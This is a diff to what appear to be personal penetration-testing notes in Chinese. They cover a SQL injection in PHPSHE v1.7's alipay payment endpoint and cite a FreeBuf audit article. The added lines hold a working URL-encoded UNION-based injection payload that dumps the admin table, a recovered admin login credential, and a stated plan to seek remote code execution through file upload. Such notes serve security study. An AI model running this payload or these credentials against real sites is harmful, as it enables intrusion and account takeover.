@@ -79,3 +79,18 @@ Please input first
 [代码审计之phpshev1.7前台注入和zzzphpv1.74后台sql注入 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/254237.html)
 
 payload：
+```
+/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,((select`3`from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_
+```
+
+注出来的value是md5值需要解密
+
+![](attachments/Pasted%20image%2020230415121448.png)
+
+![](attachments/Pasted%20image%2020230415121345.png)
+
+admin/atlman777   登录后台
+
+搜索后并没有phpshe的后台漏洞，再在后台最可能的是文件上传来rce
+
+![](attachments/Pasted%20image%2020230415122154.png)
